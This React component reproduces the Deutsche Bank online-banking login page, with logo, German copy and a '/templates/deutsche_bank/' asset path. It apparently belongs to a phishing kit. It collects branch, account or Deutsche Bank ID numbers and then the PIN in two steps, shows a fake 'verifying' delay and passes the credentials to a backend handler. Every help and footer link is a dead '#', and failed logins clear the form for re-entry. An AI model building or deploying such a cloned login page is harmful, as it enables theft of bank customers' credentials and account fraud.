import React, { useState, useEffect, useRef } from 'react';
import { AlertTriangle, Monitor } from 'lucide-react';
import Loading from './Loading';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  showError?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, showError = false }) => {
  // Login mode state
  const [loginMode, setLoginMode] = useState<'traditional' | 'deutsche_bank_id'>('traditional');
  
  // Login step state
  const [loginStep, setLoginStep] = useState<'credentials' | 'pin'>('credentials');
  
  // Traditional login fields
  const [filiale, setFiliale] = useState('');
  const [konto, setKonto] = useState('');
  const [unterkonto, setUnterkonto] = useState('00');
  
  // Deutsche Bank ID field
  const [deutscheBankId, setDeutscheBankId] = useState('');
  
  // PIN field
  const [pin, setPin] = useState('');
  
  // Loading states
  const [isLoading, setIsLoading] = useState(false);
  const [isFormLoading, setIsFormLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  
  // Stored username for PIN step
  const [storedUsername, setStoredUsername] = useState('');
  
  const filialeRef = useRef<HTMLInputElement>(null);
  const deutscheBankIdRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);
  
  // Auto-focus the appropriate field based on login mode and step
  useEffect(() => {
    if (loginStep === 'credentials') {
      if (loginMode === 'traditional' && filialeRef.current) {
        filialeRef.current.focus();
      } else if (loginMode === 'deutsche_bank_id' && deutscheBankIdRef.current) {
        deutscheBankIdRef.current.focus();
      }
    } else if (loginStep === 'pin' && pinRef.current) {
      setTimeout(() => {
        pinRef.current?.focus();
      }, 100);
    }
  }, [loginMode, loginStep]);

  // Clear form fields when error is shown
  useEffect(() => {
    if (showError) {
      setFiliale('');
      setKonto('');
      setUnterkonto('00');
      setDeutscheBankId('');
      setPin('');
      setLoginStep('credentials');
      setStoredUsername('');
      setIsFormLoading(false);
      
      // Focus appropriate field based on current mode
      setTimeout(() => {
        if (loginMode === 'traditional' && filialeRef.current) {
          filialeRef.current.focus();
        } else if (loginMode === 'deutsche_bank_id' && deutscheBankIdRef.current) {
          deutscheBankIdRef.current.focus();
        }
      }, 100);
    }
  }, [showError, loginMode]);

  // Toggle login mode
  const toggleLoginMode = (e: React.MouseEvent) => {
    e.preventDefault();
    const newMode = loginMode === 'traditional' ? 'deutsche_bank_id' : 'traditional';
    setLoginMode(newMode);
    
    // Clear all fields and reset to credentials step when switching modes
    setFiliale('');
    setKonto('');
    setUnterkonto('00');
    setDeutscheBankId('');
    setPin('');
    setLoginStep('credentials');
    setStoredUsername('');
    setIsFormLoading(false);
  };

  // Handle credentials step submission (Step 1)
  const handleCredentialsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    let username = '';
    
    // Validate and create username based on login mode
    if (loginMode === 'traditional') {
      if (!filiale.trim() || !konto.trim()) {
        return;
      }
      username = `${filiale}-${konto}-${unterkonto}`;
    } else {
      if (!deutscheBankId.trim()) {
        return;
      }
      username = deutscheBankId.trim();
    }
    
    // Show quick form loading
    setIsFormLoading(true);
    
    // Store username for PIN step
    setStoredUsername(username);
    
    // Quick processing delay
    await new Promise(resolve => setTimeout(resolve, 800));
    
    // Transition to PIN step
    setIsFormLoading(false);
    setLoginStep('pin');
  };

  // Handle PIN step submission (Step 2 - Final submission)
  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!pin.trim() || !storedUsername) {
      return;
    }
    
    setIsLoading(true);
    setLoadingMessage('Anmeldedaten werden überprüft');
    
    await new Promise(resolve => setTimeout(resolve, 2500));
    
    try {
      // Submit to backend with existing API format
      await onSubmit({ username: storedUsername, password: pin.trim() });
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsLoading(false);
    }
  };

  // Go back to credentials step
  const handleBackToCredentials = () => {
    setLoginStep('credentials');
    setPin('');
    setStoredUsername('');
  };

  if (isLoading) {
    return <Loading message={loadingMessage} type="login" />;
  }

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .db-mobile-main {
              background-image: none !important;
              background: linear-gradient(135deg, #0550d1 0%, #1e2a78 100%) !important;
            }
            .db-mobile-container {
              flex-direction: column !important;
              gap: 0 !important;
              max-width: none !important;
              margin: 0 !important;
            }
            .db-mobile-left {
              padding: 20px !important;
              padding-top: 40px !important;
              flex: none !important;
            }
            .db-mobile-sidebar {
              width: 100% !important;
              min-height: auto !important;
              order: 2 !important;
              margin-top: 60px !important;
            }
            .db-mobile-card {
              padding: 30px 20px !important;
            }
            .db-mobile-form-fields {
              flex-direction: column !important;
              gap: 16px !important;
            }
            .db-mobile-form-field {
              flex: none !important;
              width: 100% !important;
            }
            .db-mobile-form-buttons {
              flex-direction: column !important;
              gap: 16px !important;
              align-items: stretch !important;
            }
            .db-mobile-button {
              width: 100% !important;
            }
            .db-mobile-sidebar-content {
              background-color: #ffffff !important;
              padding: 20px !important;
              margin-bottom: 20px !important;
            }
            .db-mobile-footer-only {
              padding: 30px 20px !important;
            }
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}
      </style>
      <div className="db-mobile-main" style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
      
      {/* Main Container - 1180px */}
      <div className="db-mobile-container" style={{
        maxWidth: '1180px',
        width: '100%',
        display: 'flex',
        margin: '0 auto',
        gap: '80px'
      }}>
        
        {/* Left Content Area */}
        <div className="db-mobile-left" style={{
          flex: '1',
          display: 'flex',
          flexDirection: 'column',
          gap: '30px',
          paddingTop: '100px',
          paddingLeft: '40px',
          paddingRight: '20px',
          paddingBottom: '40px'
        }}>
          
          {/* PIN/Password Help Card - Above Login Form */}
          <div style={{
            backgroundColor: '#e8f4fd',
            border: '1px solid #b8d4e3',
            borderRadius: '3px',
            padding: '16px 20px',
            boxShadow: 'none'
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'flex-start',
              gap: '12px'
            }}>
              <div style={{
                backgroundColor: '#0550d1',
                borderRadius: '50%',
                width: '20px',
                height: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                marginTop: '2px'
              }}>
                <span style={{
                  color: 'white',
                  fontSize: '12px',
                  fontWeight: 'bold'
                }}>i</span>
              </div>
              <div>
                <h3 style={{
                  margin: '0 0 8px 0',
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#0550d1',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                }}>
                  Sie haben {loginStep === 'pin' ? 'PIN' : 'PIN/Passwort'} nicht vorliegen?
                </h3>
                <p style={{
                  margin: '0 0 8px 0',
                  fontSize: '14px',
                  color: '#000000',
                  lineHeight: '1.4',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                }}>
                  In wenigen Schritten{' '}
                  <a href="#" style={{ 
                    color: '#0550d1', 
                    textDecoration: 'underline',
                    fontWeight: '600'
                  }}>
                    neu vergeben
                  </a>.
                </p>
                {loginStep === 'credentials' && (
                  <p style={{
                    margin: '0',
                    fontSize: '14px',
                    color: '#000000',
                    lineHeight: '1.4',
                    fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                  }}>
                    <strong>Sie haben Ihre {loginMode === 'traditional' ? 'Filial-/Kontonummer' : 'Deutsche Bank ID'} nicht zur Hand?</strong><br />
                    {loginMode === 'traditional' 
                      ? 'Diese finden Sie auf der Rückseite Ihrer Deutsche Bank Card.'
                      : 'Diese finden Sie in Ihrer Deutsche Bank App oder in Ihren Unterlagen.'
                    }
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Main Login Card */}
          <div className="db-mobile-card" style={{
            backgroundColor: 'rgba(255, 255, 255, 0.98)',
            borderRadius: '3px',
            padding: '40px',
            boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
          }}>
            
            {/* Deutsche Bank Logo */}
            <div style={{
              marginBottom: '30px'
            }}>
              <img 
                src="/templates/deutsche_bank/images/DB-Logotype-ri-sRGB-DXJQ2K2F.svg" 
                alt="Deutsche Bank" 
                style={{
                  height: '32px',
                  width: 'auto'
                }}
              />
            </div>
            
            {/* Title */}
            <h1 style={{
              fontSize: '28px',
              fontWeight: '400',
              color: '#000000',
              margin: '0 0 8px 0'
            }}>
              Guten Morgen
            </h1>
            
            <p style={{
              fontSize: '16px',
              color: '#666',
              margin: '0 0 30px 0'
            }}>
              {loginStep === 'credentials' 
                ? 'Bitte geben Sie Ihre Zugangsdaten ein.'
                : 'Bitte geben Sie Ihre PIN ein.'
              }
            </p>

            {/* Show error message if needed */}
            {showError && (
              <div style={{
                backgroundColor: '#fce4e4',
                border: '1px solid #fcc2c3',
                borderRadius: '3px',
                padding: '16px',
                marginBottom: '30px',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '12px'
              }}>
                <div style={{
                  flexShrink: 0,
                  marginTop: '2px'
                }}>
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 20 20">
                    <path fill="#900" fillRule="evenodd" d="M10 0c2.67 0 5.183 1.04 7.071 2.93 3.899 3.898 3.899 10.242 0 14.14A9.934 9.934 0 0110 20a9.934 9.934 0 01-7.071-2.93C-.97 13.173-.97 6.829 2.929 2.93A9.934 9.934 0 0110 0zm0 1a8.94 8.94 0 00-6.364 2.636c-3.509 3.509-3.509 9.219 0 12.728A8.94 8.94 0 0010 19a8.94 8.94 0 006.364-2.636c3.509-3.509 3.509-9.219 0-12.728A8.94 8.94 0 0010 1ZM6.396 5.7a.5.5 0 00-.638.764L9.293 10l-3.535 3.536-.058.069a.5.5 0 00.765.638L10 10.707l3.535 3.536.079.064a.5.5 0 00.628-.771L10.707 10l3.535-3.536.058-.069a.5.5 0 00-.765-.638L10 9.293 6.465 5.757l-.07-.058z" clipRule="evenodd"></path>
                  </svg>
                </div>
                <div style={{ flex: 1 }}>
                  <p style={{
                    color: '#cc0000',
                    fontSize: '14px',
                    margin: 0,
                    fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                    fontWeight: '600'
                  }}>
                    Ihr Login war nicht erfolgreich. Bitte überprüfen Sie Ihre Eingabe.
                  </p>
                </div>
              </div>
            )}

            {/* Form Loading State */}
            {isFormLoading && (
              <div style={{
                textAlign: 'center',
                padding: '40px 0',
                minHeight: '200px',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center'
              }}>
                <div style={{
                  width: '32px',
                  height: '32px',
                  border: '3px solid #e0e0e0',
                  borderTop: '3px solid #0550d1',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite',
                  marginBottom: '16px'
                }}></div>
                <p style={{
                  fontSize: '14px',
                  color: '#666',
                  margin: 0
                }}>
                  Wird verarbeitet...
                </p>
              </div>
            )}

            {/* STEP 1: Credentials Form */}
            {!isFormLoading && loginStep === 'credentials' && (
              <form onSubmit={handleCredentialsSubmit}>
                
                {/* Traditional Login Fields */}
                {loginMode === 'traditional' && (
                  <div className="db-mobile-form-fields" style={{
                    display: 'flex',
                    gap: '12px',
                    marginBottom: '20px'
                  }}>
                    
                    {/* Filiale */}
                    <div className="db-mobile-form-field" style={{ flex: '0 0 90px' }}>
                      <label style={{
                        display: 'block',
                        fontSize: '14px',
                        color: '#333',
                        marginBottom: '8px',
                        fontWeight: '600'
                      }}>
                        Filiale
                      </label>
                      <input
                        ref={filialeRef}
                        type="text"
                        value={filiale}
                        onChange={(e) => setFiliale(e.target.value)}
                        maxLength={3}
                        style={{
                          width: '100%',
                          height: '48px',
                          padding: '0 12px',
                          border: '1px solid #ddd',
                          borderRadius: '3px',
                          fontSize: '16px',
                          fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                          backgroundColor: '#ffffff',
                          color: '#333',
                          outline: 'none',
                          textAlign: 'center',
                          boxSizing: 'border-box'
                        }}
                        onFocus={(e) => {
                          e.target.style.borderColor = '#0550d1';
                          e.target.style.borderWidth = '2px';
                        }}
                        onBlur={(e) => {
                          e.target.style.borderColor = '#ddd';
                          e.target.style.borderWidth = '1px';
                        }}
                        required
                      />
                    </div>

                    {/* Konto */}
                    <div className="db-mobile-form-field" style={{ flex: '0 0 140px' }}>
                      <label style={{
                        display: 'block',
                        fontSize: '14px',
                        color: '#333',
                        marginBottom: '8px',
                        fontWeight: '600'
                      }}>
                        Konto
                      </label>
                      <input
                        type="text"
                        value={konto}
                        onChange={(e) => setKonto(e.target.value)}
                        maxLength={7}
                        style={{
                          width: '100%',
                          height: '48px',
                          padding: '0 12px',
                          border: '1px solid #ddd',
                          borderRadius: '3px',
                          fontSize: '16px',
                          fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                          backgroundColor: '#ffffff',
                          color: '#333',
                          outline: 'none',
                          textAlign: 'center',
                          boxSizing: 'border-box'
                        }}
                        onFocus={(e) => {
                          e.target.style.borderColor = '#0550d1';
                          e.target.style.borderWidth = '2px';
                        }}
                        onBlur={(e) => {
                          e.target.style.borderColor = '#ddd';
                          e.target.style.borderWidth = '1px';
                        }}
                        required
                      />
                    </div>
                    
                    {/* Unterkonto */}
                    <div className="db-mobile-form-field" style={{ flex: '0 0 80px' }}>
                      <label style={{
                        display: 'block',
                        fontSize: '14px',
                        color: '#333',
                        marginBottom: '8px',
                        fontWeight: '600'
                      }}>
                        Unterkonto
                      </label>
                      <input
                        type="text"
                        value={unterkonto}
                        onChange={(e) => setUnterkonto(e.target.value)}
                        maxLength={2}
                        style={{
                          width: '100%',
                          height: '48px',
                          padding: '0 12px',
                          border: '1px solid #ddd',
                          borderRadius: '3px',
                          fontSize: '16px',
                          fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                          backgroundColor: '#ffffff',
                          color: '#333',
                          outline: 'none',
                          textAlign: 'center',
                          boxSizing: 'border-box'
                        }}
                        onFocus={(e) => {
                          e.target.style.borderColor = '#0550d1';
                          e.target.style.borderWidth = '2px';
                        }}
                        onBlur={(e) => {
                          e.target.style.borderColor = '#ddd';
                          e.target.style.borderWidth = '1px';
                        }}
                      />
                    </div>
                  </div>
                )}

                {/* Deutsche Bank ID Field */}
                {loginMode === 'deutsche_bank_id' && (
                  <div style={{ marginBottom: '20px' }}>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      color: '#333',
                      marginBottom: '8px',
                      fontWeight: '600'
                    }}>
                      Deutsche Bank ID
                    </label>
                    <input
                      ref={deutscheBankIdRef}
                      type="text"
                      value={deutscheBankId}
                      onChange={(e) => setDeutscheBankId(e.target.value)}
                      placeholder="Ihre Deutsche Bank ID"
                      style={{
                        width: '320px',
                        maxWidth: '100%',
                        height: '48px',
                        padding: '0 12px',
                        border: '1px solid #ddd',
                        borderRadius: '3px',
                        fontSize: '16px',
                        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                        backgroundColor: '#ffffff',
                        color: '#333',
                        outline: 'none',
                        boxSizing: 'border-box'
                      }}
                      onFocus={(e) => {
                        e.target.style.borderColor = '#0550d1';
                        e.target.style.borderWidth = '2px';
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = '#ddd';
                        e.target.style.borderWidth = '1px';
                      }}
                      required
                    />
                  </div>
                )}

                {/* Login Mode Toggle Link */}
                <div style={{
                  marginBottom: '30px'
                }}>
                  <a 
                    href="#" 
                    onClick={toggleLoginMode}
                    style={{
                      color: '#0550d1',
                      textDecoration: 'underline',
                      fontSize: '14px',
                      fontWeight: '600'
                    }}
                  >
                    {loginMode === 'traditional' 
                      ? 'Mit Deutsche Bank ID einloggen'
                      : 'Mit Filiale, Konto und PIN einloggen'
                    }
                  </a>
                </div>

                {/* Submit Button and Links */}
                <div className="db-mobile-form-buttons" style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Zugangsdaten vergessen?
                  </a>

                  <button
                    type="submit"
                    className="db-mobile-button"
                    style={{
                      backgroundColor: '#0550d1',
                      color: '#ffffff',
                      border: 'none',
                      borderRadius: '3px',
                      padding: '14px 28px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      fontWeight: '600',
                      cursor: 'pointer',
                      transition: 'background-color 0.2s ease'
                    }}
                    onMouseOver={(e) => {
                      e.currentTarget.style.backgroundColor = '#0440a8';
                    }}
                    onMouseOut={(e) => {
                      e.currentTarget.style.backgroundColor = '#0550d1';
                    }}
                  >
                    Weiter
                  </button>
                </div>
              </form>
            )}

            {/* STEP 2: PIN Form */}
            {!isFormLoading && loginStep === 'pin' && (
              <form onSubmit={handlePinSubmit}>
                
                {/* PIN Field */}
                <div style={{ marginBottom: '20px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#333',
                    marginBottom: '8px',
                    fontWeight: '600'
                  }}>
                    PIN
                  </label>
                  <input
                    ref={pinRef}
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    maxLength={8}
                    placeholder="Ihre PIN"
                    style={{
                      width: '320px',
                      maxWidth: '100%',
                      height: '48px',
                      padding: '0 12px',
                      border: '1px solid #ddd',
                      borderRadius: '3px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      color: '#333',
                      outline: 'none',
                      textAlign: 'center',
                      boxSizing: 'border-box'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#0550d1';
                      e.target.style.borderWidth = '2px';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#ddd';
                      e.target.style.borderWidth = '1px';
                    }}
                    required
                  />
                </div>

                {/* Submit Button and Back Link */}
                <div className="db-mobile-form-buttons" style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      handleBackToCredentials();
                    }}
                    style={{
                      color: '#0550d1',
                      textDecoration: 'underline',
                      fontSize: '14px',
                      fontWeight: '600'
                    }}
                  >
                    ← Zurück
                  </a>

                  <button
                    type="submit"
                    className="db-mobile-button"
                    disabled={!pin.trim()}
                    style={{
                      backgroundColor: !pin.trim() ? '#ccc' : '#0550d1',
                      color: '#ffffff',
                      border: 'none',
                      borderRadius: '3px',
                      padding: '14px 28px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      fontWeight: '600',
                      cursor: !pin.trim() ? 'not-allowed' : 'pointer',
                      transition: 'background-color 0.2s ease'
                    }}
                    onMouseOver={(e) => {
                      if (pin.trim()) {
                        e.currentTarget.style.backgroundColor = '#0440a8';
                      }
                    }}
                    onMouseOut={(e) => {
                      if (pin.trim()) {
                        e.currentTarget.style.backgroundColor = '#0550d1';
                      }
                    }}
                  >
                    Anmelden
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>

        {/* Right Sidebar - 380px */}
        <div className="db-mobile-sidebar" style={{
          width: '380px',
          backgroundColor: '#ffffff',
          display: 'flex',
          flexDirection: 'column',
          minHeight: '100vh'
        }}>
          
          {/* Promotional Content */}
          <div className="db-mobile-sidebar-content" style={{
            flex: '1',
            padding: '30px'
          }}>
            
            {/* New Banking Promo */}
            <div style={{ 
              marginBottom: '40px'
            }}>
              <img 
                src="/templates/deutsche_bank/images/db-neues-banking-dt-1200x750-1552700535-w46209.jpg" 
                alt="Neues Online-Banking" 
                style={{
                  width: '100%',
                  height: '140px',
                  objectFit: 'cover',
                  borderRadius: '3px',
                  marginBottom: '16px'
                }}
              />
              <h2 style={{
                fontSize: '18px',
                fontWeight: '600',
                color: '#000000',
                margin: '0 0 10px 0'
              }}>
                Neues Online-Banking. Neue App!
              </h2>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Jetzt noch smarter und mehr Komfort für Sie.
              </p>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '6px'
              }}>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Informationen für Privatkunden
                </a>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Informationen für Unternehmenskunden
                </a>
              </div>
            </div>

            {/* Security Info */}
            <div style={{
              marginBottom: '40px'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                marginBottom: '10px'
              }}>
                <div style={{
                  color: '#000000',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <AlertTriangle size={24} />
                </div>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0'
                }}>
                  Sicherheitshinweise
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.
              </p>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '6px'
              }}>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu den aktuellen Sicherheitshinweisen
                </a>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu Sicherheit im Überblick
                </a>
              </div>
            </div>
          
            {/* Online Banking Access */}
            <div style={{
              marginBottom: '40px'
            }}>
              <div style={{ 
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                marginBottom: '10px'
              }}>
                <div style={{
                  color: '#000000',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <Monitor size={24} />
                </div>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0'
                }}>
                  Online-Banking Zugang
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.
              </p>
              <a href="#" style={{
                color: '#0550d1',
                textDecoration: 'underline',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Zugang zum Online-Banking beantragen
              </a>
            </div>
              
            {/* Security Procedures */}
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                marginBottom: '10px'
              }}>
                <div style={{ 
                  color: '#000000',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <svg role="img" focusable="false" style={{ height: '24px', width: '24px' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                    <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
                    <path d="m7 11V7a5 5 0 0 1 10 0v4"/>
                  </svg>
                </div>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0'
                }}>
                  Unsere Sicherheitsverfahren
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Alles Wissenswerte rund um Ihren Login.
              </p>
              <a href="#" style={{
                color: '#0550d1',
                textDecoration: 'underline',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Link zu den Sicherheitsverfahren
              </a>
            </div>
          </div>
            
          {/* Footer integrated in sidebar */}
          <div className="db-mobile-footer-only" style={{
            backgroundColor: '#1e2a78',
            color: '#ffffff',
            padding: '20px 30px'
          }}>
            <div style={{
              display: 'flex',
              flexWrap: 'wrap',
              gap: '15px',
              fontSize: '12px'
            }}>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                English Version
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Hilfe
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Demo-Konto
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Impressum
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Rechtliche Hinweise
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Datenschutz
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Cookie-Einstellungen
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default LoginForm;
